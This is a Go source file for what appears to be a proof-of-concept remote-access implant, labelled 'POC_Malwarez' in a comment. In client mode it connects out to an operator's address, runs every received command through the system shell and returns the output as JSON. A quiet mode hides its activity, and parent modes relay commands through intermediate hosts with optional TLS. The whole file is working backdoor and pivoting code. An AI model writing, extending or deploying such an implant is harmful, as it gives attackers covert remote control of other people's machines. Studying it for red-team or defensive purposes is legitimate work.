package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strings"
	"time"
)

// "/Blog/POC_Malwarez/arp_connect_main/ARP"

/* TO DO

[DONE] NO PRINTING TO SCREEN
CHECK IF CLIENT AND PARENT WORK ON LINUX

Add TLS within itself

error handlign to identify if connection is dropped

might be worth making a function for sending and receiving?


// when launching parent mode, if admin is not ready it crashes

*/

var (
	// to handle errors throughout
	err error
	// IP and Port for client to connect
	clientConnect = flag.String("clientconnect", "", "Where the client should connect, for use in Client modeconnection must be in form <ip>:<Port> eg: 127.0.0.1:9999")
	// IP and Port for Parent to connect
	parentConnect = flag.String("parentconnect", "", "Where the parent should connect, for use in Client modeconnection must be in form <ip>:<Port> eg: 127.0.0.1:9999")
	//IP and Port for Parent to LISTEN on
	parentListen = flag.String("parentlisten", "", "What Port should the parent listen on, for use in Client modeconnection must be in form <port> eg: 10000")
	// To Skip PAUSES in tool
	skipEnter = flag.Bool("skip", false, "Will skip Enter requirement and run automatically, speeds testing")
	// TLS or NO TLS
	tlsOn = flag.Bool("tls", false, "Will add TLS to the network traffic")
	// Mode to be run in
	mode  = flag.String("mode", "", "mode {client|parent|clientlist|parentlist}")
	quiet = flag.Bool("silence", false, "To run in quiet mode, nothing will be printed to the screen")
)

type Results struct {
	CommandsList []string
	ID           int
	Command      string
	Output       string
	Time         string
}

func checkError(err error) {
	if err != nil {
		fmt.Println("Fatal error ", err.Error())
		os.Exit(1)
	}
}

func OSCheck() string {
	var OSShell string
	if runtime.GOOS == "windows" {
		fmt.Println(quietCheck("OS identified as Windows"))
		//command =
		OSShell = "windows"
		// err := ni

	} else if runtime.GOOS == "linux" {
		fmt.Println(quietCheck("OS identified as: Linux"))
		OSShell = "linux"

	}
	return OSShell

}

func getTime() string { // func to get current time
	currentTime := time.Now()
	return currentTime.Format("2006-01-02 15:04:05")

}

func executeCommand(checkOS string, commandString string) *Results {

	var results string
	if checkOS == "windows" {
		CommandExec, err := exec.Command("cmd", "/C", commandString).Output()
		if err != nil {
			if *quiet == false {
				fmt.Println("Error executing command", err)
			}
			CommandExec = []byte("Error executing command")

			// NEED TO FIX UNABLE TO EXECUTE SENDING
		}
		CommandExec2 := string(CommandExec)
		results = strings.TrimSpace(CommandExec2)

	} else if checkOS == "linux" {
		CommandExec, err := exec.Command(strings.TrimSpace(commandString)).Output()
		if err != nil {
			if *quiet == false {
				fmt.Println("Error executing command", err)
			}
			CommandExec = []byte("Error executing command")

		}
		CommandExec2 := string(CommandExec) // need for commands on linux - remove \r\n
		results = strings.TrimSpace(CommandExec2)
	}

	//getting current time so analysts can correlate with other tools

	currentTime := getTime()
	//using the Results structure
	outputTest := &Results{
		ID:      1, // TODO: need to make this random for multiple children
		Output:  results,
		Time:    currentTime,
		Command: commandString,
	}

	return outputTest
}

func listMode(c net.Conn) {

	if *quiet == false {
		fmt.Println("###PRINTING TO SCREENONLY in ListMode")
		fmt.Println("Running in Command List Mode")
	}

	if *skipEnter == false {
		reader := bufio.NewReader(os.Stdin)
		fmt.Println("<PRESS ENTER TO CONTINUE>")
		_, _ = reader.ReadString('\n')
	}
	// // clientConnect2 := *clientConnect
	// c, err := net.Dial("tcp", *clientConnect)
	// if err != nil {
	// 	fmt.Println(err)
	// 	return
	// }
	defer c.Close()
	// fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to ", *clientConnect, "\n")))
	// fmt.Println(quietCheck("===Connection successful=="))
	fmt.Println(quietCheck("Reading Commands list"))

	// if c has no connect, break

	// need to Decode
	var inputTest Results
	decoder := json.NewDecoder(c)
	decoder.Decode(&inputTest)
	checkOS := OSCheck()
	for _, value := range inputTest.CommandsList {
		fmt.Println(quietCheck(fmt.Sprintf("Command Received->: " + value)))

		commandString := executeCommand(checkOS, value)

		encoder := json.NewEncoder(c)
		// fmt.Printf("current time is :%s", currentTime.Format("2006-01-02 15:04:05"))

		encoder.Encode(commandString)
		// decoder := json.NewDecoder(c)
		// decoder.Decode(&outputTest)
		fmt.Println(quietCheck(fmt.Sprintf("Encoded format:", commandString)))
	}
}

func quietCheck(toPrint string) string {
	checkQuiet := ""
	if *quiet == false {
		checkQuiet = toPrint
	}
	return checkQuiet
}
func connectTLS() net.Conn {

	var connparent net.Conn
	// if *quiet == false {
	if *tlsOn == true {
		CA_Pool := x509.NewCertPool()
		severCert, err := ioutil.ReadFile("../openssl/mydomain.com.crt")
		if err != nil {
			log.Fatal("Could not load server certificate!")
		}
		CA_Pool.AppendCertsFromPEM(severCert)

		config := tls.Config{RootCAs: CA_Pool}

		if *mode == "client" {
			// fmt.Printf("Attempting to connect to %s with TLS \n ", *clientConnect)
			connparent, err = tls.Dial("tcp", *clientConnect, &config)
			// c, err := net.Dial("tcp", CONNECT)

			if err != nil {
				fmt.Println(err)
				os.Exit(1)
			}
			fmt.Println(quietCheck("===Connection Successful=="))
		} else if *mode == "clientlist" {
			fmt.Printf("Attempting to connect to %s with no TLS \n", *clientConnect)
			connparent, err = tls.Dial("tcp", *clientConnect, &config)
			// c, err := net.Dial("tcp", CONNECT)
			if err != nil {
				fmt.Println(err)
			}

			fmt.Println(quietCheck("===Connection Successful=="))
		} else if *mode == "parent" {
			fmt.Printf("Attempting to connect to %s with TLS \n", *parentConnect)
			connparent, err = tls.Dial("tcp", *parentConnect, &config)
			// c, err := net.Dial("tcp", CONNECT)
			fmt.Println(quietCheck("===Connection Successful=="))
			if err != nil {
				fmt.Println(err)
			}
		} else if *mode == "parentlist" {
			fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to %s with TLS \n", *parentConnect)))
			connparent, err = tls.Dial("tcp", *parentConnect, &config)
			// c, err := net.Dial("tcp", CONNECT)
			fmt.Println(quietCheck("===Connection Successful=="))
		}

	} else {
		if *mode == "client" {
			fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to %s with no TLS", *clientConnect)))
			// fmt.Printf("Attempting to connect to %s with no TLS \n", *clientConnect)
			connparent, _ = net.Dial("tcp", *clientConnect)

			fmt.Println(quietCheck("===Connection Successful=="))
			// if err != nil {
			// 	fmt.Println(err)
			// }

		} else if *mode == "clientlist" {
			fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to %s with no TLS \n", *clientConnect)))
			connparent, _ = net.Dial("tcp", *clientConnect)

			fmt.Println(quietCheck("===Connection Successful=="))
		} else if *mode == "parent" {
			fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to %s with no TLS \n", *parentConnect)))
			connparent, err = net.Dial("tcp", *parentConnect)
			if err != nil {
				fmt.Println(err)
				os.Exit(1)
			}
			fmt.Println(quietCheck("===Connection Successful=="))

		} else if *mode == "parentlist" {
			// fmt.Printf("Attempting to connect to %s with no TLS \n", *parentConnect)
			fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to %s with no TLS \n", *parentConnect)))
			connparent, _ = net.Dial("tcp", *parentConnect)
			// c, err := net.Dial("tcp", CONNECT)
			fmt.Println(quietCheck("===Connection Successful=="))
		}

	}
	// need to add parent mode LISTEN
	return connparent
}

func clientMode(c net.Conn) {

	defer c.Close()

	fmt.Println(quietCheck("Listening for commands"))
	checkOS := OSCheck()
	for {

		// if c has no connect, break

		commandString := bufio.NewScanner(c)
		commandString.Scan()
		if err := commandString.Err(); err != nil {
			log.Println("ERROR: " + err.Error())
			os.Exit(1)
		}

		fmt.Println(quietCheck(fmt.Sprintf("Command Received->: " + commandString.Text())))
		value := string(commandString.Text())
		if strings.TrimSpace(value) == "STOP" {
			fmt.Println("TCP client exiting...")
			return
		}
		// fmt.Println("CMD received->: ", commandString.Text())

		commandresults := executeCommand(checkOS, value)

		encoder := json.NewEncoder(c)
		if err := encoder.Encode(commandresults); err != nil {
			log.Println("ERROR sending: " + err.Error())

			return
		}

		fmt.Println(quietCheck(fmt.Sprintf("Encoded format:", commandresults)))

	}
}

func parentListMode(c net.Conn) {
	defer c.Close()

	var listenChild net.Listener
	PORT := *parentListen

	if *tlsOn == true {
		cert, err := tls.LoadX509KeyPair("C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\mydomain.com.crt", "C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\mydomain.com.key")
		checkError(err)

		configServer := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}

		listenChild, err = tls.Listen("tcp", PORT, &configServer)
		if err != nil {
			fmt.Println("Error")
		}

	} else {
		listenChild, err = net.Listen("tcp", PORT)
		if err != nil {
			fmt.Println("Error:", err)

		}
	}

	defer listenChild.Close()
	if *quiet == false {
		fmt.Println("SERVER ESTABLISHED ON: " + PORT + " WAITING FOR CHILD TO CONNECT")
	}
	childconnect, err := listenChild.Accept()
	if err != nil {
		fmt.Println(err, "UNABLE TO CONNECT")
	} else if *quiet == false {
		fmt.Println("CHILD connected on", PORT)

	}

	//f if commands list is blank

	// need to Decode
	var inputTest Results
	decoder := json.NewDecoder(c)
	if err := decoder.Decode(&inputTest); err != nil {
		log.Println("ERROR Receiving Command List to foward to Client: " + err.Error())
		// os.exit()
		return
	}
	// sending to child
	encoder := json.NewEncoder(childconnect)
	// fmt.Printf("current time is :%s", currentTime.Format("2006-01-02 15:04:05"))

	encoder.Encode(inputTest)
	// decoder := json.NewDecoder(c)
	// decoder.Decode(&outputTest)

	//receiving
	var outputTest Results

	for x := 0; x < len(inputTest.CommandsList); x++ {
		//receiving and decoding from Child
		decoder := json.NewDecoder(childconnect)
		if err := decoder.Decode(&outputTest); err != nil {
			log.Println("ERROR Receiving Results from Child " + err.Error())
			// os.exit()
			return
		}
		//encoding and sending to Admin
		encoder := json.NewEncoder(c)

		if err := encoder.Encode(outputTest); err != nil {
			log.Println("ERROR Sending Results to Admin: " + err.Error())
			// os.exit()
			return
		}
	}

}

func parentMode(c net.Conn) {

	defer c.Close()
	var l2 net.Listener
	PORT := *parentListen

	if *tlsOn == true {
		cert, err := tls.LoadX509KeyPair("C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\mydomain.com.crt", "C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\mydomain.com.key")
		checkError(err)

		configServer := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}

		l2, err = tls.Listen("tcp", PORT, &configServer)
		if err != nil {
			fmt.Println("Unable to List on port: ", PORT)
			os.Exit(1)
		}

	} else {
		l2, err = net.Listen("tcp", PORT)
		if err != nil {
			fmt.Println("Unable to List on port: ", PORT)
			os.Exit(1)
		}
	}

	defer l2.Close()
	if *quiet == false {
		fmt.Println("SERVER ESTABLISHED ON: " + PORT + " WAITING FOR CHILD TO CONNECT")
	}
	c2, err := l2.Accept()
	if err != nil {
		fmt.Println(err, "UNABLE TO CONNECT")
		log.Fatal(err)
	} else {
		if *quiet == false {
			fmt.Println("CHILD connected on", PORT)
		}
	}
	//f if commands list is blank

	for {

		//var results string
		//Reading in ADMIN COMMAND
		commandString, err := bufio.NewReader(c).ReadString('\n')
		// commandString, err := ioutil.ReadAll(c)
		if err != nil {
			log.Println("ERROR: " + err.Error())
			os.Exit(1)
		}

		fmt.Print(quietCheck(fmt.Sprintf("COMMAND RECEIVED FROM ADMIN->: " + commandString)))

		if strings.TrimSpace(string(commandString)) == "STOP" {
			if *quiet == false {
				fmt.Println("TCP client exiting...")
			}
			break
		}

		text := commandString
		fmt.Fprintf(c2, text+"\n")

		// if strings.TrimSpace(string(text)) == "STOP" {
		// 	fmt.Println("Closing TCP server!")
		// 	return
		// }
		buf := make([]byte, 4096)
		// reading data from child
		len, err := c2.Read(buf)

		if err != nil {
			fmt.Println("Error reading:", err.Error())
			break
		}
		// writing to ADMIN server
		c.Write([]byte(buf[:len]))

		//end of main for loop
	}
}

func validateAddress(connect string, name string) {
	patternIP := "^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}:([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$"
	regexIP, _ := regexp.MatchString(patternIP, connect)
	if regexIP == false {

		fmt.Println("ERROR: NOT IN CORRECT IP FORMAT such as 192.168.0.1:1234")
		fmt.Println("Supplied: ", name, connect)
		os.Exit(1)
	}
	return
}

func main() {
	// flags declaration using flag package for CLI arguments
	// mode := flag.String("mode", "", "mode {client|parent|list}")

	// commands := flag.Bool("commands", false, "Execute a list of commands")
	// regex for IP

	//parsing flags
	flag.Parse()

	if *mode == "" {
		flag.PrintDefaults()
		fmt.Println("error in flags")
		os.Exit(1)
	}

	fmt.Println(quietCheck(fmt.Sprintf("Using %s mode \n", *mode)))

	if *mode == "client" {
		validateAddress(*clientConnect, "-clientconnect")
		clientMode(connectTLS())
	} else if *mode == "parent" {
		validateAddress(*parentConnect, "-parentconnect")
		validateAddress(*parentListen, "-parentlisten")
		parentMode(connectTLS())
	} else if *mode == "clientlist" {
		validateAddress(*clientConnect, "-clientconnect")
		listMode(connectTLS())
	} else if *mode == "parentlist" {
		validateAddress(*parentConnect, "-parentconnect")
		validateAddress(*parentListen, "-parentlisten")
		parentListMode(connectTLS())
	} else {
		fmt.Println("ERROR No correct modes")
		os.Exit(1)
	}

}
